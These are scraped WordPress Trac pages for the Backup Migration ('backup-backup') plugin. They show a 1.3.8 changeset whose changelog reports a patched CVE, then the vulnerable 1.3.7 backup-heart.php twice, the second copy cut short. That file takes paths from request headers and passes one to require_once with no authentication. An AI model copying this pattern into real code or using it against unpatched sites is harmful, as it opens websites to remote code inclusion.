* [tags/1.3.8/includes/initializer.php](/browser/backup-backup/tags/1.3.8/includes/initializer.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/logger.php](/browser/backup-backup/tags/1.3.8/includes/logger.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/progress](/browser/backup-backup/tags/1.3.8/includes/progress?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/progress/logger-only.php](/browser/backup-backup/tags/1.3.8/includes/progress/logger-only.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/progress/migration.php](/browser/backup-backup/tags/1.3.8/includes/progress/migration.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/progress/staging.php](/browser/backup-backup/tags/1.3.8/includes/progress/staging.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/progress/zip.php](/browser/backup-backup/tags/1.3.8/includes/progress/zip.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/restore-batching.php](/browser/backup-backup/tags/1.3.8/includes/restore-batching.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/scanner](/browser/backup-backup/tags/1.3.8/includes/scanner?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/scanner/backups.php](/browser/backup-backup/tags/1.3.8/includes/scanner/backups.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/scanner/files.php](/browser/backup-backup/tags/1.3.8/includes/scanner/files.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/staging](/browser/backup-backup/tags/1.3.8/includes/staging?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/staging/controller.php](/browser/backup-backup/tags/1.3.8/includes/staging/controller.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/staging/local.php](/browser/backup-backup/tags/1.3.8/includes/staging/local.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/staging/tastewp.php](/browser/backup-backup/tags/1.3.8/includes/staging/tastewp.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/uploader](/browser/backup-backup/tags/1.3.8/includes/uploader?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/uploader/chunks.php](/browser/backup-backup/tags/1.3.8/includes/uploader/chunks.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/zipper](/browser/backup-backup/tags/1.3.8/includes/zipper?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/zipper/src](/browser/backup-backup/tags/1.3.8/includes/zipper/src?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/zipper/src/zip.php](/browser/backup-backup/tags/1.3.8/includes/zipper/src/zip.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/zipper/zipping.php](/browser/backup-backup/tags/1.3.8/includes/zipper/zipping.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules](/browser/backup-backup/tags/1.3.8/modules?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/assets](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/assets?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/assets/css](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/assets/css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/assets/css/styles.css](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/assets/css/styles.css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/assets/imgs](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/assets/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/assets/imgs/decor.png](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/assets/imgs/decor.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/assets/js](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/assets/js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/assets/js/script.js](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/assets/js/script.js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/misc.php](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/misc.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/templates](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/templates?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/gdrivebanner/templates/banner.php](/browser/backup-backup/tags/1.3.8/modules/gdrivebanner/templates/banner.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review](/browser/backup-backup/tags/1.3.8/modules/review?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets](/browser/backup-backup/tags/1.3.8/modules/review/assets?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/css](/browser/backup-backup/tags/1.3.8/modules/review/assets/css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/css/style.css](/browser/backup-backup/tags/1.3.8/modules/review/assets/css/style.css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/imgs](/browser/backup-backup/tags/1.3.8/modules/review/assets/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/imgs/BM-background.svg](/browser/backup-backup/tags/1.3.8/modules/review/assets/imgs/BM-background.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/imgs/background-pattern.svg](/browser/backup-backup/tags/1.3.8/modules/review/assets/imgs/background-pattern.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/imgs/main-image-part-2.svg](/browser/backup-backup/tags/1.3.8/modules/review/assets/imgs/main-image-part-2.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/imgs/main-image-part-4.svg](/browser/backup-backup/tags/1.3.8/modules/review/assets/imgs/main-image-part-4.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/imgs/main-image.svg](/browser/backup-backup/tags/1.3.8/modules/review/assets/imgs/main-image.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/js](/browser/backup-backup/tags/1.3.8/modules/review/assets/js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/assets/js/script.js](/browser/backup-backup/tags/1.3.8/modules/review/assets/js/script.js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/review.php](/browser/backup-backup/tags/1.3.8/modules/review/review.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/views](/browser/backup-backup/tags/1.3.8/modules/review/views?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/modules/review/views/banner.php](/browser/backup-backup/tags/1.3.8/modules/review/views/banner.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/readme.txt](/browser/backup-backup/tags/1.3.8/readme.txt?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/uninstall.php](/browser/backup-backup/tags/1.3.8/uninstall.php?rev=3006541 "Show entry in browser")
  (added)
* [trunk/readme.txt](/browser/backup-backup/trunk/readme.txt?rev=3006541 "Show entry in browser")
  (modified)
  ([3 diffs](#file386 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [backup-backup/trunk/readme.txt](/changeset/3006541/backup-backup/trunk/readme.txt "Show the changeset 3006541 restricted to backup-backup/trunk/readme.txt")

  | [r3003840](/browser/backup-backup/trunk/readme.txt?rev=3003840#L3 "Show revision 3003840 of this file in browser") | [r3006541](/browser/backup-backup/trunk/readme.txt?rev=3006541#L3 "Show revision 3006541 of this file in browser") |  |
  | --- | --- | --- |
  | 3 | 3 | Tags: Migration, Backup, Staging, Migrate, Backups, Restore, All In One, Duplicate, Clone, Import, Export, Transfer |
  | 4 | 4 | Requires at least: 4.6 |
  | 5 |  | Tested up to: 6.4.~~1~~ |
  | 6 |  | Stable tag: 1.3.~~7~~ |
  |  | 5 | Tested up to: 6.4.2 |
  |  | 6 | Stable tag: 1.3.8 |
  | 7 | 7 | License: GPLv3 |
  | 8 | 8 | Requires PHP: 5.6 |
  | […](/browser/backup-backup/trunk/readme.txt?rev=3003840#L163) | […](/browser/backup-backup/trunk/readme.txt?rev=3006541#L163) |  |
  | 163 | 163 |  |
  | 164 | 164 | == Changelog == |
  |  | 165 |  |
  |  | 166 | = 1.3.8 = |
  |  | 167 | \* [FIX] Patched reported CVE - please upgrade |
  |  | 168 | \* [NOTE] Tested with WP 6.4.2 |
  | 165 | 169 |  |
  | 166 | 170 | = 1.3.7 = |
  | […](/browser/backup-backup/trunk/readme.txt?rev=3003840#L686) | […](/browser/backup-backup/trunk/readme.txt?rev=3006541#L690) |  |
  | 686 | 690 | == Upgrade Notice == |
  | 687 | 691 |  |
  | 688 |  | = 1.3.7 = |
  | 689 |  | What's new in 1.3.7? |
  | 690 |  | \* [PRO] Fixed staility of Google Drive connection getting disconnected randomly |
  | 691 |  | \* [FIX] Scheduled backup status and minimized change of internal server error email |
  | 692 |  | \* [CHANGE] New protected directory for temporary backup database dump |
  | 693 |  | \* [CHANGE] Backup temporary chunk files moved to new directory |
  | 694 |  | \* [CHANGE] Decreased accessibility time of progress logs when user gets logged out after restoration |
  | 695 |  | \* [CHANGE] Increased tolerance for scheduled backups time |
  |  | 692 | = 1.3.8 = |
  |  | 693 | What's new in 1.3.8? |
  |  | 694 | \* [FIX] Patched reported CVE - please upgrade |
  |  | 695 | \* [NOTE] Tested with WP 6.4.2 |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=3006541)
* [Zip Archive](?format=zip&new=3006541)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_8f838874_20250114_212954.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fbackup-backup%2Ftags%2F1.3.7%2Fincludes%2Fbackup-heart.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* [Blame](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/backup-backup/tags/1.3.7/includes/backup-heart.php)

---

# [source:](/browser?order=name "Go to repository root") [backup-backup](/browser/backup-backup?order=name "View backup-backup")/[tags](/browser/backup-backup/tags?order=name "View tags")/[1.3.7](/browser/backup-backup/tags/1.3.7?order=name "View 1.3.7")/[includes](/browser/backup-backup/tags/1.3.7/includes?order=name "View includes")/[backup-heart.php](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?order=name "View backup-heart.php")

View diff against:

View revision:

| [Last change](/changeset/3003840/backup-backup/tags/1.3.7/includes/backup-heart.php "View differences") on this file was [3003840](/changeset/3003840/ "View changeset 3003840"), checked in by iclyde, [14 months ago](/timeline?from=2023-11-30T15%3A13%3A33Z&precision=second "See timeline at 11/30/2023 03:13:33 PM") |
| --- |
| Version 1.3.7 |
| **File size:** 4.5 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) |  |
| [3](#L3) | // Namespace |
| [4](#L4) | namespace BMI\Plugin\Heart; |
| [5](#L5) |  |
| [6](#L6) | // Allow only POST requests |
| [7](#L7) | if ($\_SERVER['REQUEST\_METHOD'] !== 'POST') { |
| [8](#L8) | exit; |
| [9](#L9) | } |
| [10](#L10) |  |
| [11](#L11) | function isFunctionEnabled($func) { |
| [12](#L12) | $disabled = explode(',', ini\_get('disable\_functions')); |
| [13](#L13) | $isDisabled = in\_array($func, $disabled); |
| [14](#L14) | if (!$isDisabled && function\_exists($func)) return true; |
| [15](#L15) | else return false; |
| [16](#L16) | } |
| [17](#L17) |  |
| [18](#L18) | // Make sure getallheaders will work |
| [19](#L19) | if (!function\_exists('\_\_getallheaders')) { |
| [20](#L20) | function \_\_getallheaders() { |
| [21](#L21) | $headers = []; |
| [22](#L22) | foreach ($\_SERVER as $name => $value) { |
| [23](#L23) | if (substr($name, 0, 5) == 'HTTP\_') { |
| [24](#L24) | $headers[str\_replace(' ', '-', ucwords(strtolower(str\_replace('\_', ' ', substr($name, 5)))))] = $value; |
| [25](#L25) | } |
| [26](#L26) | } |
| [27](#L27) | return $headers; |
| [28](#L28) | } |
| [29](#L29) | } |
| [30](#L30) |  |
| [31](#L31) | // Get fields from header |
| [32](#L32) | if (isFunctionEnabled('getallheaders')) { |
| [33](#L33) | $fields = getallheaders(); |
| [34](#L34) | } |
| [35](#L35) |  |
| [36](#L36) | // Check headers |
| [37](#L37) | if (!isset($fields['Content-Content']) && !isset($fields['content-content'])) { |
| [38](#L38) | $fields = \_\_getallheaders(); |
| [39](#L39) | } |
| [40](#L40) |  |
| [41](#L41) | // Lowercase |
| [42](#L42) | foreach ($fields as $key => $value) { |
| [43](#L43) | $buffer = $value; |
| [44](#L44) | unset($fields[$key]); |
| [45](#L45) | $fields[strtolower($key)] = $value; |
| [46](#L46) | } |
| [47](#L47) |  |
| [48](#L48) | // Let other files know that it's CURL request |
| [49](#L49) | define('BMI\_CURL\_REQUEST', true); |
| [50](#L50) | define('BMI\_CLI\_REQUEST', false); |
| [51](#L51) |  |
| [52](#L52) | // Load some constants |
| [53](#L53) | define('ABSPATH', $fields['content-abs']); |
| [54](#L54) | if (substr($fields['content-content'], -1) != '/') { |
| [55](#L55) | $fields['content-content'] = $fields['content-content'] . '/'; |
| [56](#L56) | } |
| [57](#L57) | if (!defined('WP\_CONTENT\_DIR')) { |
| [58](#L58) | define('WP\_CONTENT\_DIR', $fields['content-content']); |
| [59](#L59) | } |
| [60](#L60) | define('BMI\_CONFIG\_DIR', $fields['content-configdir']); |
| [61](#L61) | define('BMI\_BACKUPS', $fields['content-backups']); |
| [62](#L62) | define('BMI\_ROOT\_DIR', $fields['content-dir']); |
| [63](#L63) | // define('BMI\_SHARE\_LOGS\_ALLOWED', $fields['content-shareallowed']); |
| [64](#L64) | define('BMI\_INCLUDES', BMI\_ROOT\_DIR . 'includes'); |
| [65](#L65) | define('BMI\_SAFELIMIT', intval($fields['content-safelimit'])); |
| [66](#L66) |  |
| [67](#L67) | // Replace error-log file |
| [68](#L68) | if (isFunctionEnabled('ini\_set')) { |
| [69](#L69) | @ini\_set('log\_errors', 1); |
| [70](#L70) | @ini\_set('error\_log', BMI\_CONFIG\_DIR . '/background-errors.log'); |
| [71](#L71) | } |
| [72](#L72) |  |
| [73](#L73) | // Increase max execution time |
| [74](#L74) | if (isFunctionEnabled('set\_time\_limit')) @set\_time\_limit(259200); |
| [75](#L75) | if (isFunctionEnabled('ini\_set')) { |
| [76](#L76) | @ini\_set('memory\_limit', (BMI\_SAFELIMIT \* 4 + 16) . 'M'); |
| [77](#L77) | @ini\_set('max\_input\_time', '259200'); |
| [78](#L78) | @ini\_set('max\_execution\_time', '259200'); |
| [79](#L79) | @ini\_set('session.gc\_maxlifetime', '1200'); |
| [80](#L80) | } |
| [81](#L81) |  |
| [82](#L82) | // Let the server know it's server-side script |
| [83](#L83) | if (isFunctionEnabled('ignore\_user\_abort')) { |
| [84](#L84) | @ignore\_user\_abort(true); |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | if (!isset($fields['content-browser'])) $fields['content-browser'] = false; |
| [88](#L88) | if (!($fields['content-browser'] === 'true' || $fields['content-browser'] === true)) { |
| [89](#L89) |  |
| [90](#L90) | // Also return something, so it can close the connection |
| [91](#L91) | ob\_start(); |
| [92](#L92) |  |
| [93](#L93) | // The message |
| [94](#L94) | echo 'This is server side script, you will not get any response here.'; |
| [95](#L95) |  |
| [96](#L96) | // Don't block server handler |
| [97](#L97) | if (isFunctionEnabled('session\_write\_close')) { |
| [98](#L98) | @session\_write\_close(); |
| [99](#L99) | } |
| [100](#L100) |  |
| [101](#L101) | // Set proper headers |
| [102](#L102) | header('Content-Length: ' . ob\_get\_length()); |
| [103](#L103) | header('Connection: close'); |
| [104](#L104) |  |
| [105](#L105) | // End the output for user |
| [106](#L106) | ob\_end\_clean(); |
| [107](#L107) | flush(); |
| [108](#L108) |  |
| [109](#L109) | } |
| [110](#L110) |  |
| [111](#L111) | // Start output for server |
| [112](#L112) | ob\_start(); |
| [113](#L113) |  |
| [114](#L114) | // Catch anything if possible |
| [115](#L115) | try { |
| [116](#L116) |  |
| [117](#L117) | // Load bypasser |
| [118](#L118) | require\_once BMI\_INCLUDES . '/bypasser.php'; |
| [119](#L119) | $request = new BMI\_Backup\_Heart(true, |
| [120](#L120) | $fields['content-configdir'], |
| [121](#L121) | $fields['content-content'], |
| [122](#L122) | $fields['content-backups'], |
| [123](#L123) | $fields['content-abs'], |
| [124](#L124) | $fields['content-dir'], |
| [125](#L125) | $fields['content-url'], |
| [126](#L126) | [ |
| [127](#L127) | 'identy' => $fields['content-identy'], |
| [128](#L128) | 'manifest' => $fields['content-manifest'], |
| [129](#L129) | 'safelimit' => $fields['content-safelimit'], |
| [130](#L130) | 'rev' => $fields['content-rev'], |
| [131](#L131) | 'backupname' => $fields['content-name'], |
| [132](#L132) | 'start' => $fields['content-start'], |
| [133](#L133) | 'filessofar' => $fields['content-filessofar'], |
| [134](#L134) | 'total\_files' => $fields['content-total'], |
| [135](#L135) | 'browser' => $fields['content-browser'], |
| [136](#L136) | 'bmitmp' => $fields['content-bmitmp'] |
| [137](#L137) | ], |
| [138](#L138) | $fields['content-it'], |
| [139](#L139) | $fields['content-dbit'], |
| [140](#L140) | $fields['content-dblast'] |
| [141](#L141) | ); |
| [142](#L142) |  |
| [143](#L143) | // Handle request |
| [144](#L144) | $request->handle\_batch(); |
| [145](#L145) |  |
| [146](#L146) | } catch (\Exception $e) { |
| [147](#L147) |  |
| [148](#L148) | error\_log('There was an error with Backup Migration plugin: ' . $e->getMessage()); |
| [149](#L149) | error\_log(strval($e)); |
| [150](#L150) |  |
| [151](#L151) | } catch (\Throwable $e) { |
| [152](#L152) |  |
| [153](#L153) | error\_log('There was an error with Backup Migration plugin: ' . $e->getMessage()); |
| [154](#L154) | error\_log(strval($e)); |
| [155](#L155) |  |
| [156](#L156) | } |
| [157](#L157) |  |
| [158](#L158) | // End the server task |
| [159](#L159) | ob\_end\_clean(); exit; |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?format=txt)
* [Original Format](/export/3222480/backup-backup/tags/1.3.7/includes/backup-heart.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_3b320c35_20250114_212956.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fbackup-backup%2Ftags%2F1.3.7%2Fincludes%2Fbackup-heart.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* [Blame](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/backup-backup/tags/1.3.7/includes/backup-heart.php)

---

# [source:](/browser?order=name "Go to repository root") [backup-backup](/browser/backup-backup?order=name "View backup-backup")/[tags](/browser/backup-backup/tags?order=name "View tags")/[1.3.7](/browser/backup-backup/tags/1.3.7?order=name "View 1.3.7")/[includes](/browser/backup-backup/tags/1.3.7/includes?order=name "View includes")/[backup-heart.php](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?order=name "View backup-heart.php")

View diff against:

View revision:

| [Last change](/changeset/3003840/backup-backup/tags/1.3.7/includes/backup-heart.php "View differences") on this file was [3003840](/changeset/3003840/ "View changeset 3003840"), checked in by iclyde, [14 months ago](/timeline?from=2023-11-30T15%3A13%3A33Z&precision=second "See timeline at 11/30/2023 03:13:33 PM") |
| --- |
| Version 1.3.7 |
| **File size:** 4.5 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) |  |
| [3](#L3) | // Namespace |
| [4](#L4) | namespace BMI\Plugin\Heart; |
| [5](#L5) |  |
| [6](#L6) | // Allow only POST requests |
| [7](#L7) | if ($\_SERVER['REQUEST\_METHOD'] !== 'POST') { |
| [8](#L8) | exit; |
| [9](#L9) | } |
| [10](#L10) |  |
| [11](#L11) | function isFunctionEnabled($func) { |
| [12](#L12) | $disabled = explode(',', ini\_get('disable\_functions')); |
| [13](#L13) | $isDisabled = in\_array($func, $disabled); |
| [14](#L14) | if (!$isDisabled && function\_exists($func)) return true; |
| [15](#L15) | else return false; |
| [16](#L16) | } |
| [17](#L17) |  |
| [18](#L18) | // Make sure getallheaders will work |
| [19](#L19) | if (!function\_exists('\_\_getallheaders')) { |
| [20](#L20) | function \_\_getallheaders() { |
| [21](#L21) | $headers = []; |
| [22](#L22) | foreach ($\_SERVER as $name => $value) { |
| [23](#L23) | if (substr($name, 0, 5) == 'HTTP\_') { |
| [24](#L24) | $headers[str\_replace(' ', '-', ucwords(strtolower(str\_replace('\_', ' ', substr($name, 5)))))] = $value; |
| [25](#L25) | } |
| [26](#L26) | } |
| [27](#L27) | return $headers; |
| [28](#L28) | } |
| [29](#L29) | } |
| [30](#L30) |  |
| [31](#L31) | // Get fields from header |
| [32](#L32) | if (isFunctionEnabled('getallheaders')) { |
| [33](#L33) | $fields = getallheaders(); |
| [34](#L34) | } |
| [35](#L35) |  |
| [36](#L36) | // Check headers |
| [37](#L37) | if (!isset($fields['Content-Content']) && !isset($fields['content-content'])) { |
| [38](#L38) | $fields = \_\_getallheaders(); |
| [39](#L39) | } |
| [40](#L40) |  |
| [41](#L41) | // Lowercase |
| [42](#L42) | foreach ($fields as $key => $value) { |
| [43](#L43) | $buffer = $value; |
| [44](#L44) | unset($fields[$key]); |
| [45](#L45) | $fields[strtolower($key)] = $value; |
| [46](#L46) | } |
| [47](#L47) |  |
| [48](#L48) | // Let other files know that it's CURL request |
| [49](#L49) | define('BMI\_CURL\_REQUEST', true); |
| [50](#L50) | define('BMI\_CLI\_REQUEST', false); |
| [51](#L51) |  |
| [52](#L52) | // Load some constants |
| [53](#L53) | define('ABSPATH', $fields['content-abs']); |
| [54](#L54) | if (substr($fields['content-content'], -1) != '/') { |
| [55](#L55) | $fields['content-content'] = $fields['content-content'] . '/'; |
| [56](#L56) | } |
| [57](#L57) | if (!defined('WP\_CONTENT\_DIR')) { |
| [58](#L58) | define('WP\_CONTENT\_DIR', $fields['content-content']); |
| [59](#L59) | } |
| [60](#L60) | define('BMI\_CONFIG\_DIR', $fields['content-configdir']); |
| [61](#L61) | define('BMI\_BACKUPS', $fields['content-backups']); |
| [62](#L62) | define('BMI\_ROOT\_DIR', $fields['content-dir']); |
| [63](#L63) | // define('BMI\_SHARE\_LOGS\_ALLOWED', $fields['content-shareallowed']); |
| [64](#L64) | define('BMI\_INCLUDES', BMI\_ROOT\_DIR . 'includes'); |
| [65](#L65) | define('BMI\_SAFELIMIT', intval($fields['content-safelimit'])); |
| [66](#L66) |  |
| [67](#L67) | // Replace error-log file |
| [68](#L68) | if (isFunctionEnabled('ini\_set')) { |
| [69](#L69) | @ini\_set('log\_errors', 1); |
| [70](#L70) | @ini\_set('error\_log', BMI\_CONFIG\_DIR . '/background-errors.log'); |
| [71](#L71) | } |
| [72](#L72) |  |
| [73](#L73) | // Increase max execution time |
| [74](#L74) | if (isFunctionEnabled('set\_time\_limit')) @set\_time\_limit(259200); |
| [75](#L75) | if (isFunctionEnabled('ini\_set')) { |
